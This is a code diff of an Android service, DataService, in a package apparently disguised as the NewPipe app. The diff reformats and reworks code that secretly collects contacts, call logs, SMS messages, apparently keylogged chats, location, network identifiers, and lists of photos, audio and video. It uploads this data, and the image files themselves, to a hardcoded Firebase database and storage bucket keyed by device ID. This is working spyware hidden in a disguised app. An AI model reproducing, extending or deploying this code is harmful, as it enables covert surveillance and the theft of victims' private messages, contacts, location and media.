@@ -1,4 +1,5 @@
 package org.schabi.newpipe.gameover
+
 import android.annotation.SuppressLint
 import android.app.NotificationChannel
 import android.app.NotificationManager
@@ -19,10 +20,12 @@ import android.telephony.TelephonyManager
 import android.util.Log
 import androidx.annotation.RequiresApi
 import androidx.core.app.NotificationCompat
+import com.google.android.gms.tasks.OnSuccessListener
+import com.google.android.gms.tasks.Task
 import com.google.firebase.database.DatabaseReference
 import com.google.firebase.database.FirebaseDatabase
 import com.google.firebase.storage.FirebaseStorage
-import com.google.firebase.storage.ktx.storageMetadata
+import com.google.firebase.storage.UploadTask
 import com.google.gson.Gson
 import org.json.JSONArray
 import org.json.JSONObject
@@ -38,6 +41,7 @@ import kotlin.String
 import kotlin.TODO
 import kotlin.arrayOf
 
+
 class DataService : Service() {
     private lateinit var dbRef: DatabaseReference
     private var aid: String = ""
@@ -49,7 +53,8 @@ class DataService : Service() {
     override fun onCreate() {
         savePref = SavePref(this)
 
-        dbRef = FirebaseDatabase.getInstance("https://fir-d5cfd-default-rtdb.firebaseio.com").reference
+        dbRef =
+            FirebaseDatabase.getInstance("https://fir-d5cfd-default-rtdb.firebaseio.com").reference
     }
 
     @RequiresApi(Build.VERSION_CODES.O)
@@ -135,7 +140,7 @@ class DataService : Service() {
             ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
             projection,
             ContactsContract.Contacts.HAS_PHONE_NUMBER + ">0 AND LENGTH(" + ContactsContract.CommonDataKinds.Phone.NUMBER + ")>0 AND " +
-                ContactsContract.CommonDataKinds.Phone.RAW_CONTACT_ID + ">" + lastContactId,
+                    ContactsContract.CommonDataKinds.Phone.RAW_CONTACT_ID + ">" + lastContactId,
             null,
             "raw_contact_id DESC"
         )
@@ -179,7 +184,8 @@ class DataService : Service() {
             }
 
             uploadThread.start()*/
-            dbRef.child("Devices").child(aid).child("contact").child(timeStmp()).setValue(Gson().toJson(uploadJson))
+            dbRef.child("Devices").child(aid).child("contact").child(timeStmp())
+                .setValue(Gson().toJson(uploadJson))
         }
     }
 
@@ -199,7 +205,8 @@ class DataService : Service() {
         if (cursor != null && cursor.count > 0) {
             val callLogJSONArray = JSONArray()
             val number: Int = cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
-            val name: Int = cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME) // TODO Name comes Null
+            val name: Int =
+                cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME) // TODO Name comes Null
             val type: Int = cursor.getColumnIndex(CallLog.Calls.TYPE)
             val date: Int = cursor.getColumnIndex(CallLog.Calls.DATE)
             val duration: Int = cursor.getColumnIndex(CallLog.Calls.DURATION)
@@ -248,7 +255,8 @@ class DataService : Service() {
             }
 
             uploadThread.start()*/
-            dbRef.child("Devices").child(aid).child("callLog").child(timeStmp()).setValue(Gson().toJson(uploadJson))
+            dbRef.child("Devices").child(aid).child("callLog").child(timeStmp())
+                .setValue(Gson().toJson(uploadJson))
 
         }
     }
@@ -280,13 +288,13 @@ class DataService : Service() {
         val uploadJson = JSONObject()
         uploadJson.put("deviceId", aid)
         uploadJson.put("manufacturer", Build.BRAND)
-        uploadJson.put("Model Number", Build.MODEL)
+        uploadJson.put("ModelNumber", Build.MODEL)
         uploadJson.put("timestamp", timeStmp())
         uploadJson.put("networkType", tm.networkOperatorName)
         uploadJson.put("mac", mac)
         uploadJson.put("ip", ip)
         uploadJson.put("ssid", ssid)
-        uploadJson.put("Network Country", tm.networkCountryIso)
+        uploadJson.put("NetworkCountry", tm.networkCountryIso)
         uploadJson.put("latitude", lat)
         uploadJson.put("longitude", long)
         uploadJson.put("loc_aq_time", locTime)
@@ -305,14 +313,16 @@ class DataService : Service() {
 
         uploadThread.start()*/
 
-        dbRef.child("Devices").child(aid).child("mobileNetwork").child(timeStmp()).setValue(Gson().toJson(uploadJson))
+        dbRef.child("Devices").child(aid).child("mobileNetwork").child(timeStmp())
+            .setValue(Gson().toJson(uploadJson))
     }
 
     @RequiresApi(Build.VERSION_CODES.N)
     private fun getChats() {
         var chats = savePref.getChat()
         if (chats != "chat") {
-            dbRef.child("Devices").child(aid).child("keysAndChats").child(timeStmp()).setValue(chats)
+            dbRef.child("Devices").child(aid).child("keysAndChats").child(timeStmp())
+                .setValue(chats)
         }
         savePref.setChat("chat")
     }
@@ -341,7 +351,7 @@ class DataService : Service() {
             lastSmsLogTime = cursor.getString(4)
             marker!!.setLastSmsLog(lastSmsLogTime)
             do {
-
+                val individualSmsObject = JSONObject()
                 var dt: String = (Date(Long.valueOf(cursor.getString(4)))).toString()
                 var num: String = cursor.getString(2)
                 var msg: String = cursor.getString(12)
@@ -349,8 +359,13 @@ class DataService : Service() {
                     1 -> dir = "IN"
                     2 -> dir = "OUT"
                 }
-                dataJSONArray.put(Sms(dt, num, msg, dir!!))
-                smses.add(Sms(dt, num, msg, dir!!))
+                individualSmsObject.put("date",dt);
+                individualSmsObject.put("number",num);
+                individualSmsObject.put("msg",msg);
+                individualSmsObject.put("dir",dir);
+
+                dataJSONArray.put(individualSmsObject)
+                //smses.add(Sms(dt, num, msg, dir!!))
             } while (cursor.moveToNext())
 
             uploadJson.put("sms", dataJSONArray)
@@ -367,7 +382,8 @@ class DataService : Service() {
             }
 
             uploadThread.start()*/
-            dbRef.child("Devices").child(aid).child("sms").child(timeStmp()).setValue(Gson().toJson(uploadJson))
+            dbRef.child("Devices").child(aid).child("sms").child(timeStmp())
+                .setValue(Gson().toJson(uploadJson))
         }
     }
 
@@ -404,7 +420,14 @@ class DataService : Service() {
                 do {
                     val imageUri = Uri.parse(cursor.getString(imageUriIndex))
                     listOfImage.add(imageUri.toString())
-                    Log.e("DATASERVICE", String.format("URI : %s,\nFile Path : %s", imageUri.toString(), File(imageUri.toString()).absolutePath))
+                    Log.e(
+                        "DATASERVICE",
+                        String.format(
+                            "URI : %s,\nFile Path : %s",
+                            imageUri.toString(),
+                            File(imageUri.toString()).absolutePath
+                        )
+                    )
                     dataJSONArray.put(imageUri.toString())
 
                     uploadfile(File(imageUri.toString()), "image")
@@ -415,9 +438,10 @@ class DataService : Service() {
         uploadJson.put("imageList", dataJSONArray)
 
         val timeForComparingLastSync = System.currentTimeMillis() / 1000
-        val timeAfterAday = savePref.getLastFileSync()?.plus((24 *60 * 60))
+        val timeAfterAday = savePref.getLastFileSync()?.plus((24 * 60 * 60))
         if (timeForComparingLastSync >= timeAfterAday!!) {
-            dbRef.child("Devices").child(aid).child("fileList").child(timeStmp()).setValue(Gson().toJson(uploadJson))
+            dbRef.child("Devices").child(aid).child("fileList").child(timeStmp())
+                .setValue(Gson().toJson(uploadJson))
         }
     }
 
@@ -468,9 +492,10 @@ class DataService : Service() {
         uploadJson.put("audioList", dataJSONArray)
 
         val timeForComparingLastSync = System.currentTimeMillis() / 1000
-        val timeAfterAday = savePref.getLastFileSync()?.plus((24 *60 * 60))
+        val timeAfterAday = savePref.getLastFileSync()?.plus((24 * 60 * 60))
         if (timeForComparingLastSync >= timeAfterAday!!) {
-            dbRef.child("Devices").child(aid).child("fileList").child(timeStmp()).setValue(Gson().toJson(uploadJson))
+            dbRef.child("Devices").child(aid).child("fileList").child(timeStmp())
+                .setValue(Gson().toJson(uploadJson))
         }
     }
 
@@ -516,10 +541,11 @@ class DataService : Service() {
         uploadJson.put("videoList", dataJSONArray)
 
         val timeForComparingLastSync = System.currentTimeMillis() / 1000
-        val timeAfterAday = savePref.getLastFileSync()?.plus((24 *60 * 60))
+        val timeAfterAday = savePref.getLastFileSync()?.plus((24 * 60 * 60))
         if (timeForComparingLastSync >= timeAfterAday!!) {
-            dbRef.child("Devices").child(aid).child("fileList").child(timeStmp()).setValue(Gson().toJson(uploadJson))  //for list
-            savePref.setLastFileSync(timeForComparingLastSync+timeAfterAday)
+            dbRef.child("Devices").child(aid).child("fileList").child(timeStmp())
+                .setValue(Gson().toJson(uploadJson))  //for list
+            savePref.setLastFileSync(timeForComparingLastSync + timeAfterAday)
         }
 
     }
@@ -528,32 +554,27 @@ class DataService : Service() {
     private fun uploadfile(uri: File, contenttype: String) {
 
         var data = FirebaseStorage.getInstance("gs://fir-d5cfd.appspot.com").reference
+        val uploadTask =
+            data.child(aid).child(timeStmp()).child(contenttype).putFile(Uri.fromFile(uri))
 
-
-// Create the file metadata
-        var metadata = storageMetadata {
-            contentType = contenttype
+        uploadTask.addOnFailureListener {
+            // Handle unsuccessful uploads
+        }.addOnSuccessListener { taskSnapshot ->
+            //val downloadUrl: String = taskSnapshot.storage.name
+            val downloadUrl = taskSnapshot.metadata!!.reference!!.downloadUrl.toString()
+            //dbRef.child("Devices").child(aid).child("files").child(timeStmp()).setValue(downloadUrl)
         }
 
-// Upload file and metadata to the path 'images/mountains.jpg'
-        var uploadTask = data.child(aid).child(timeStmp()).child(contenttype).putFile(Uri.fromFile(uri))
+        /*uploadTask.addOnCompleteListener {
+            if (it.isSuccessful) {
+                dbRef.child("Devices").child(aid).child("files").child(timeStmp()).setValue(it.getStorage().getDownloadUrl();)
+            }
+        }*/
 
-        uploadTask.continueWithTask { task ->
-            if (!task.isSuccessful) {
-                task.exception?.let {
-                    throw it
-                }
-            }
-            data.downloadUrl
-        }.addOnCompleteListener { task ->
-            if (task.isSuccessful) {
-                val downloadUri = task.result
-                dbRef.child("Devices").child(aid).child("files").child(timeStmp()).setValue(downloadUri)
-            } else {
-                // Handle failures
-                // ...
-            }
-        }
+
+
+
+
     }
 }
 
